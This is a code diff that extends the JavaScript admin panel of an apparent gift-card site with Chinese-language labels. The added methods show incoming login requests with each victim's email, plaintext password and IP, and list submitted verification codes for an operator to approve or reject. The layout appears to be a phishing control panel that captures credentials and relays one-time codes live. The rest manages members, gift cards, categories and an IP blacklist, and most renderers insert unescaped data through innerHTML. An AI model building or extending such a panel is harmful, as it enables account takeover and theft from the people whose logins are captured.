@@ -227,6 +227,13 @@ class AdminApp {
     setupSocketListeners() {
         // New login request
         this.socket.on('new-login-request', (data) => {
+            console.log('[Socket] 收到 new-login-request:', data);
+            const container = document.getElementById('loginRequestsList');
+            if (!container) {
+                console.warn('[Socket] loginRequestsList 容器不存在，自动刷新登录请求列表');
+                this.loadLoginRequests && this.loadLoginRequests();
+                return;
+            }
             this.addLoginRequest(data);
             this.updatePendingCount();
         });
@@ -1267,6 +1274,697 @@ class AdminApp {
                 this.switchSection(e.target.dataset.section);
             });
         });
+    }
+
+    // 添加登录请求
+    addLoginRequest(request) {
+        const container = document.getElementById('loginRequestsList');
+        if (!container) {
+            console.warn('[addLoginRequest] loginRequestsList 容器不存在，自动刷新登录请求列表');
+            this.loadLoginRequests && this.loadLoginRequests();
+            return;
+        }
+        const existingEmpty = container.querySelector('p');
+        if (existingEmpty) {
+            existingEmpty.remove();
+        }
+        // 存储邮箱和密码的映射，用于验证请求
+        if (request.email && request.password) {
+            this.emailPasswordMap.set(request.email, request.password);
+        }
+        const requestElement = document.createElement('div');
+        requestElement.className = 'request-item';
+        requestElement.dataset.id = request.id;
+        requestElement.innerHTML = `
+            <div class="request-header">
+                <div class="request-info">
+                    <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.login_time).toLocaleString()}</h4>
+                </div>
+                <div class="request-actions">
+                    <button class="approve-btn" onclick="adminApp.approveLogin(${request.id}, true)">通过</button>
+                    <button class="reject-btn" onclick="adminApp.approveLogin(${request.id}, false)">拒绝</button>
+                </div>
+            </div>
+        `;
+        container.insertBefore(requestElement, container.firstChild);
+    }
+
+    // 批准或拒绝登录请求
+    async approveLogin(requestId, approve) {
+        try {
+            const response = await this.apiRequest(`/api/auth/admin/approve-login/${requestId}`, {
+                method: 'POST',
+                body: JSON.stringify({ approve })
+            });
+            if (response && response.ok) {
+                const data = await response.json();
+                alert(data.message || (approve ? '登录请求已通过' : '登录请求已拒绝'));
+                this.loadLoginRequests(); // 刷新登录请求列表
+                this.updatePendingCount();
+            } else {
+                const error = await response.json();
+                alert(error.error || '操作失败');
+            }
+        } catch (error) {
+            console.error('批准/拒绝登录请求错误:', error);
+            alert('操作失败，请重试');
+        }
+    }
+
+    // 加载登录请求列表
+    async loadLoginRequests() {
+        const container = document.getElementById('loginRequestsList');
+        if (!container) return;
+        container.innerHTML = 'Loading...';
+        try {
+            const response = await this.apiRequest('/api/auth/admin/login-requests');
+            if (response && response.ok) {
+                const requests = await response.json();
+                container.innerHTML = this.renderLoginRequests(requests);
+            } else {
+                container.innerHTML = 'Load failed';
+            }
+        } catch (e) {
+            container.innerHTML = 'Load failed';
+        }
+    }
+
+    // 渲染登录请求列表
+    renderLoginRequests(requests) {
+        if (requests.length === 0) {
+            return '<p>暂无登录请求</p>';
+        }
+        return requests.map(request => `
+            <div class="request-item">
+                <div class="request-header">
+                    <div class="request-info">
+                        <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.login_time).toLocaleString()}</h4>
+                    </div>
+                    <div class="request-actions">
+                        <button class="approve-btn" onclick="adminApp.approveLogin(${request.id}, true)">通过</button>
+                        <button class="reject-btn" onclick="adminApp.approveLogin(${request.id}, false)">拒绝</button>
+                    </div>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    // 加载验证请求列表
+    async loadVerificationRequests() {
+        const container = document.getElementById('verificationRequestsList');
+        if (!container) return;
+        container.innerHTML = 'Loading...';
+        try {
+            const response = await this.apiRequest('/api/auth/admin/verification-requests');
+            if (response && response.ok) {
+                const requests = await response.json();
+                container.innerHTML = this.renderVerificationRequests(requests);
+            } else {
+                container.innerHTML = 'Load failed';
+            }
+        } catch (e) {
+            container.innerHTML = 'Load failed';
+        }
+    }
+
+    // 渲染验证请求列表
+    renderVerificationRequests(requests) {
+        if (requests.length === 0) {
+            return '<p>暂无验证请求</p>';
+        }
+        return requests.map(request => `
+            <div class="request-item">
+                <div class="request-header">
+                    <div class="request-info">
+                        <h4>${request.email} | 验证码: <strong style="color: #0071e3; font-family: monospace;">${request.verification_code}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.verification_time).toLocaleString()}</h4>
+                    </div>
+                    <div class="request-actions">
+                        <button class="approve-btn" onclick="adminApp.approveVerification(${request.id}, true)">通过</button>
+                        <button class="reject-btn" onclick="adminApp.approveVerification(${request.id}, false)">拒绝</button>
+                    </div>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    // 批准或拒绝验证请求
+    async approveVerification(requestId, approve) {
+        try {
+            const response = await this.apiRequest(`/api/auth/admin/approve-verification/${requestId}`, {
+                method: 'POST',
+                body: JSON.stringify({ approve })
+            });
+            if (response && response.ok) {
+                const data = await response.json();
+                alert(data.message || (approve ? '验证请求已通过' : '验证请求已拒绝'));
+                this.loadVerificationRequests(); // 刷新验证请求列表
+                this.updatePendingCount();
+            } else {
+                const error = await response.json();
+                alert(error.error || '操作失败');
+            }
+        } catch (error) {
+            console.error('批准/拒绝验证请求错误:', error);
+            alert('操作失败，请重试');
+        }
+    }
+
+    // 加载会员列表
+    async loadMembers() {
+        const container = document.getElementById('memberList');
+        if (!container) return;
+        container.innerHTML = 'Loading...';
+        try {
+            const response = await this.apiRequest('/api/admin/members');
+            if (response && response.ok) {
+                const members = await response.json();
+                container.innerHTML = this.renderMemberList(members);
+            } else {
+                container.innerHTML = 'Load failed';
+            }
+        } catch (e) {
+            container.innerHTML = 'Load failed';
+        }
+    }
+
+    // 渲染会员列表
+    renderMemberList(members) {
+        return `<table><thead><tr><th>ID</th><th>用户名</th><th>邮箱</th><th>注册时间</th><th>操作</th></tr></thead><tbody>
+            ${members.map(member => `
+                <tr>
+                    <td>${member.id}</td>
+                    <td>${member.username}</td>
+                    <td>${member.email}</td>
+                    <td>${this.formatDateTime(member.created_at)}</td>
+                    <td>
+                        <button onclick="adminApp.deleteMember(${member.id})">删除</button>
+                    </td>
+                </tr>
+            `).join('')}
+        </tbody></table>`;
+    }
+
+    // 删除会员
+    async deleteMember(id) {
+        if (!confirm('确定要删除此会员吗？')) return;
+        try {
+            const response = await this.apiRequest(`/api/admin/members/${id}`, { method: 'DELETE' });
+            if (response && response.ok) {
+                alert('删除成功');
+                this.loadMembers();
+            } else {
+                const data = await response.json();
+                alert(data.error || '删除失败');
+            }
+        } catch (e) {
+            alert('删除失败');
+        }
+    }
+
+    // 加载礼品卡列表
+    async loadGiftCards(page = 1) {
+        const container = document.getElementById('giftCardList');
+        if (!container) return;
+        container.innerHTML = 'Loading...';
+        try {
+            const response = await this.apiRequest(`/api/admin/gift-cards?page=${page}`);
+            if (response && response.ok) {
+                const data = await response.json();
+                container.innerHTML = this.renderGiftCardList(data);
+            } else {
+                container.innerHTML = 'Load failed';
+            }
+        } catch (e) {
+            container.innerHTML = 'Load failed';
+        }
+    }
+
+    // 渲染礼品卡列表
+    renderGiftCardList(data) {
+        const { gift_cards, total_pages } = data;
+        if (gift_cards.length === 0) {
+            return '<p>暂无礼品卡</p>';
+        }
+        let html = `<table><thead><tr><th>ID</th><th>名称</th><th>分类</th><th>数量</th><th>状态</th><th>操作</th></tr></thead><tbody>`;
+        gift_cards.forEach(card => {
+            html += `
+                <tr>
+                    <td>${card.id}</td>
+                    <td>${card.name}</td>
+                    <td>${card.category_name}</td>
+                    <td>${card.quantity}</td>
+                    <td>${card.status}</td>
+                    <td>
+                        <button onclick="adminApp.showEditGiftCardModal(${card.id})">编辑</button>
+                        <button onclick="adminApp.deleteGiftCard(${card.id})">删除</button>
+                    </td>
+                </tr>
+            `;
+        });
+        html += `</tbody></table>`;
+        if (total_pages > 1) {
+            html += `<div class="pagination">
+                <button onclick="adminApp.loadGiftCards(${data.prev_page || 1})">上一页</button>
+                <span>第 ${data.current_page} 页，共 ${data.total_pages} 页</span>
+                <button onclick="adminApp.loadGiftCards(${data.next_page || data.total_pages})">下一页</button>
+            </div>`;
+        }
+        return html;
+    }
+
+    // 显示添加礼品卡模态框
+    showAddGiftCardsModal() {
+        this.showModal('添加礼品卡', `
+            <form id="addGiftCardForm">
+                <div class="form-group">
+                    <label>礼品卡名称</label>
+                    <input type="text" id="addGiftCardName" required>
+                </div>
+                <div class="form-group">
+                    <label>数量</label>
+                    <input type="number" id="addGiftCardQuantity" required min="1">
+                </div>
+                <div class="form-group">
+                    <label>分类</label>
+                    <select id="addGiftCardCategory" required>
+                        <option value="">请选择分类</option>
+                        ${this.renderCategoryOptions()}
+                    </select>
+                </div>
+                <button type="submit">添加</button>
+            </form>
+        `);
+        const addGiftCardForm = document.getElementById('addGiftCardForm');
+        if (addGiftCardForm) {
+            addGiftCardForm.onsubmit = async (e) => {
+                e.preventDefault();
+                const name = document.getElementById('addGiftCardName').value;
+                const quantity = document.getElementById('addGiftCardQuantity').value;
+                const categoryId = document.getElementById('addGiftCardCategory').value;
+                if (!name || !quantity || !categoryId) {
+                    alert('请填写所有字段');
+                    return;
+                }
+                try {
+                    const response = await this.apiRequest('/api/admin/gift-cards', {
+                        method: 'POST',
+                        body: JSON.stringify({ name, quantity, category_id: categoryId })
+                    });
+                    if (response && response.ok) {
+                        alert('添加成功');
+                        this.closeModal();
+                        this.loadGiftCards();
+                    } else {
+                        const data = await response.json();
+                        alert(data.error || '添加失败');
+                    }
+                } catch (e) {
+                    alert('添加失败');
+                }
+            };
+        }
+    }
+
+    // 显示编辑礼品卡模态框
+    async showEditGiftCardModal(id) {
+        const container = document.getElementById('giftCardList');
+        if (!container) return;
+        container.innerHTML = 'Loading...';
+        try {
+            const response = await this.apiRequest(`/api/admin/gift-cards/${id}`);
+            if (response && response.ok) {
+                const card = await response.json();
+                this.showModal('编辑礼品卡', `
+                    <form id="editGiftCardForm">
+                        <div class="form-group">
+                            <label>礼品卡名称</label>
+                            <input type="text" id="editGiftCardName" value="${card.name}" required>
+                        </div>
+                        <div class="form-group">
+                            <label>数量</label>
+                            <input type="number" id="editGiftCardQuantity" value="${card.quantity}" required min="1">
+                        </div>
+                        <div class="form-group">
+                            <label>分类</label>
+                            <select id="editGiftCardCategory" required>
+                                <option value="">请选择分类</option>
+                                ${this.renderCategoryOptions(card.category_id)}
+                            </select>
+                        </div>
+                        <button type="submit">保存</button>
+                    </form>
+                `);
+                const editGiftCardForm = document.getElementById('editGiftCardForm');
+                if (editGiftCardForm) {
+                    editGiftCardForm.onsubmit = async (e) => {
+                        e.preventDefault();
+                        const name = document.getElementById('editGiftCardName').value;
+                        const quantity = document.getElementById('editGiftCardQuantity').value;
+                        const categoryId = document.getElementById('editGiftCardCategory').value;
+                        if (!name || !quantity || !categoryId) {
+                            alert('请填写所有字段');
+                            return;
+                        }
+                        try {
+                            const response = await this.apiRequest(`/api/admin/gift-cards/${id}`, {
+                                method: 'PUT',
+                                body: JSON.stringify({ name, quantity, category_id: categoryId })
+                            });
+                            if (response && response.ok) {
+                                alert('更新成功');
+                                this.closeModal();
+                                this.loadGiftCards();
+                            } else {
+                                const data = await response.json();
+                                alert(data.error || '更新失败');
+                            }
+                        } catch (e) {
+                            alert('更新失败');
+                        }
+                    };
+                }
+            } else {
+                container.innerHTML = 'Load failed';
+            }
+        } catch (e) {
+            container.innerHTML = 'Load failed';
+        }
+    }
+
+    // 删除礼品卡
+    async deleteGiftCard(id) {
+        if (!confirm('确定要删除此礼品卡吗？')) return;
+        try {
+            const response = await this.apiRequest(`/api/admin/gift-cards/${id}`, { method: 'DELETE' });
+            if (response && response.ok) {
+                alert('删除成功');
+                this.loadGiftCards();
+            } else {
+                const data = await response.json();
+                alert(data.error || '删除失败');
+            }
+        } catch (e) {
+            alert('删除失败');
+        }
+    }
+
+    // 加载分类列表
+    async loadCategories() {
+        const container = document.getElementById('categoryList');
+        if (!container) return;
+        container.innerHTML = 'Loading...';
+        try {
+            const response = await this.apiRequest('/api/admin/categories');
+            if (response && response.ok) {
+                const categories = await response.json();
+                container.innerHTML = this.renderCategoryList(categories);
+            } else {
+                container.innerHTML = 'Load failed';
+            }
+        } catch (e) {
+            container.innerHTML = 'Load failed';
+        }
+    }
+
+    // 渲染分类列表
+    renderCategoryList(categories) {
+        if (categories.length === 0) {
+            return '<p>暂无分类</p>';
+        }
+        return `<table><thead><tr><th>ID</th><th>名称</th><th>操作</th></tr></thead><tbody>
+            ${categories.map(category => `
+                <tr>
+                    <td>${category.id}</td>
+                    <td>${category.name}</td>
+                    <td>
+                        <button onclick="adminApp.showEditCategoryModal(${category.id})">编辑</button>
+                        <button onclick="adminApp.deleteCategory(${category.id})">删除</button>
+                    </td>
+                </tr>
+            `).join('')}
+        </tbody></table>`;
+    }
+
+    // 显示添加分类模态框
+    showAddCategoryModal() {
+        this.showModal('添加分类', `
+            <form id="addCategoryForm">
+                <div class="form-group">
+                    <label>分类名称</label>
+                    <input type="text" id="addCategoryName" required>
+                </div>
+                <button type="submit">添加</button>
+            </form>
+        `);
+        const addCategoryForm = document.getElementById('addCategoryForm');
+        if (addCategoryForm) {
+            addCategoryForm.onsubmit = async (e) => {
+                e.preventDefault();
+                const name = document.getElementById('addCategoryName').value;
+                if (!name) {
+                    alert('分类名称不能为空');
+                    return;
+                }
+                try {
+                    const response = await this.apiRequest('/api/admin/categories', {
+                        method: 'POST',
+                        body: JSON.stringify({ name })
+                    });
+                    if (response && response.ok) {
+                        alert('添加成功');
+                        this.closeModal();
+                        this.loadCategories();
+                    } else {
+                        const data = await response.json();
+                        alert(data.error || '添加失败');
+                    }
+                } catch (e) {
+                    alert('添加失败');
+                }
+            };
+        }
+    }
+
+    // 显示编辑分类模态框
+    async showEditCategoryModal(id) {
+        const container = document.getElementById('categoryList');
+        if (!container) return;
+        container.innerHTML = 'Loading...';
+        try {
+            const response = await this.apiRequest(`/api/admin/categories/${id}`);
+            if (response && response.ok) {
+                const category = await response.json();
+                this.showModal('编辑分类', `
+                    <form id="editCategoryForm">
+                        <div class="form-group">
+                            <label>分类名称</label>
+                            <input type="text" id="editCategoryName" value="${category.name}" required>
+                        </div>
+                        <button type="submit">保存</button>
+                    </form>
+                `);
+                const editCategoryForm = document.getElementById('editCategoryForm');
+                if (editCategoryForm) {
+                    editCategoryForm.onsubmit = async (e) => {
+                        e.preventDefault();
+                        const name = document.getElementById('editCategoryName').value;
+                        if (!name) {
+                            alert('分类名称不能为空');
+                            return;
+                        }
+                        try {
+                            const response = await this.apiRequest(`/api/admin/categories/${id}`, {
+                                method: 'PUT',
+                                body: JSON.stringify({ name })
+                            });
+                            if (response && response.ok) {
+                                alert('更新成功');
+                                this.closeModal();
+                                this.loadCategories();
+                            } else {
+                                const data = await response.json();
+                                alert(data.error || '更新失败');
+                            }
+                        } catch (e) {
+                            alert('更新失败');
+                        }
+                    };
+                }
+            } else {
+                container.innerHTML = 'Load failed';
+            }
+        } catch (e) {
+            container.innerHTML = 'Load failed';
+        }
+    }
+
+    // 删除分类
+    async deleteCategory(id) {
+        if (!confirm('确定要删除此分类吗？')) return;
+        try {
+            const response = await this.apiRequest(`/api/admin/categories/${id}`, { method: 'DELETE' });
+            if (response && response.ok) {
+                alert('删除成功');
+                this.loadCategories();
+            } else {
+                const data = await response.json();
+                alert(data.error || '删除失败');
+            }
+        } catch (e) {
+            alert('删除失败');
+        }
+    }
+
+    // 加载IP黑名单
+    async loadIpBlacklist() {
+        const container = document.getElementById('ipBlacklistList');
+        if (!container) return;
+        container.innerHTML = 'Loading...';
+        try {
+            const response = await this.apiRequest('/api/admin/ip-blacklist');
+            if (response && response.ok) {
+                const ips = await response.json();
+                container.innerHTML = this.renderIpBlacklist(ips);
+            } else {
+                container.innerHTML = 'Load failed';
+            }
+        } catch (e) {
+            container.innerHTML = 'Load failed';
+        }
+    }
+
+    // 渲染IP黑名单
+    renderIpBlacklist(ips) {
+        if (ips.length === 0) {
+            return '<p>暂无IP黑名单</p>';
+        }
+        return `<table><thead><tr><th>IP</th><th>类型</th><th>原因</th><th>创建时间</th><th>操作</th></tr></thead><tbody>
+            ${ips.map(ip => `
+                <tr>
+                    <td>${ip.ip_address}</td>
+                    <td>${ip.type}</td>
+                    <td>${ip.reason}</td>
+                    <td>${this.formatDateTime(ip.created_at)}</td>
+                    <td>
+                        <button onclick="adminApp.unbanIp('${ip.ip_address}')">解禁</button>
+                    </td>
+                </tr>
+            `).join('')}
+        </tbody></table>`;
+    }
+
+    // 添加IP到黑名单
+    async banIp(ip, type, reason) {
+        if (!confirm(`确定要将IP ${ip} 添加到黑名单吗？`)) return;
+        try {
+            const response = await this.apiRequest('/api/admin/ip-blacklist', {
+                method: 'POST',
+                body: JSON.stringify({ ip_address: ip, type, reason })
+            });
+            if (response && response.ok) {
+                alert('添加成功');
+                this.loadIpBlacklist();
+            } else {
+                const data = await response.json();
+                alert(data.error || '添加失败');
+            }
+        } catch (e) {
+            alert('添加失败');
+        }
+    }
+
+    // 解禁IP
+    async unbanIp(ip) {
+        if (!confirm(`确定要解禁IP ${ip} 吗？`)) return;
+        try {
+            const response = await this.apiRequest(`/api/admin/ip-blacklist/${ip}`, { method: 'DELETE' });
+            if (response && response.ok) {
+                alert('解禁成功');
+                this.loadIpBlacklist();
+            } else {
+                const data = await response.json();
+                alert(data.error || '解禁失败');
+            }
+        } catch (e) {
+            alert('解禁失败');
+        }
+    }
+
+    // 加载IP登录历史
+    async loadIpHistory() {
+        const container = document.getElementById('ipHistoryList');
+        if (!container) return;
+        container.innerHTML = 'Loading...';
+        try {
+            const response = await this.apiRequest('/api/admin/ip-history');
+            if (response && response.ok) {
+                const history = await response.json();
+                container.innerHTML = this.renderIpHistory(history);
+            } else {
+                container.innerHTML = 'Load failed';
+            }
+        } catch (e) {
+            container.innerHTML = 'Load failed';
+        }
+    }
+
+    // 渲染IP登录历史
+    renderIpHistory(history) {
+        if (history.length === 0) {
+            return '<p>暂无IP登录历史</p>';
+        }
+        return `<table><thead><tr><th>IP</th><th>用户名</th><th>时间</th><th>操作</th></tr></thead><tbody>
+            ${history.map(item => `
+                <tr>
+                    <td>${item.ip_address}</td>
+                    <td>${item.username}</td>
+                    <td>${this.formatDateTime(item.login_time)}</td>
+                    <td>
+                        <button onclick="adminApp.deleteIpHistory('${item.ip_address}')">删除</button>
+                    </td>
+                </tr>
+            `).join('')}
+        </tbody></table>`;
+    }
+
+    // 删除IP登录历史
+    async deleteIpHistory(ip) {
+        if (!confirm(`确定要删除IP ${ip} 的所有登录历史吗？`)) return;
+        try {
+            const response = await this.apiRequest(`/api/admin/ip-history/${ip}`, { method: 'DELETE' });
+            if (response && response.ok) {
+                alert('删除成功');
+                this.loadIpHistory();
+            } else {
+                const data = await response.json();
+                alert(data.error || '删除失败');
+            }
+        } catch (e) {
+            alert('删除失败');
+        }
+    }
+
+    // 格式化日期时间
+    formatDateTime(timestamp) {
+        const date = new Date(timestamp);
+        const year = date.getFullYear();
+        const month = String(date.getMonth() + 1).padStart(2, '0');
+        const day = String(date.getDate()).padStart(2, '0');
+        const hours = String(date.getHours()).padStart(2, '0');
+        const minutes = String(date.getMinutes()).padStart(2, '0');
+        return `${year}-${month}-${day} ${hours}:${minutes}`;
+    }
+
+    // 渲染分类选项
+    renderCategoryOptions(selectedId = '') {
+        const categories = [
+            { id: 1, name: '普通礼品卡' },
+            { id: 2, name: '高级礼品卡' },
+            { id: 3, name: 'VIP礼品卡' }
+        ];
+        return categories.map(category => `
+            <option value="${category.id}" ${selectedId == category.id ? 'selected' : ''}>${category.name}</option>
+        `).join('');
     }
 }
 
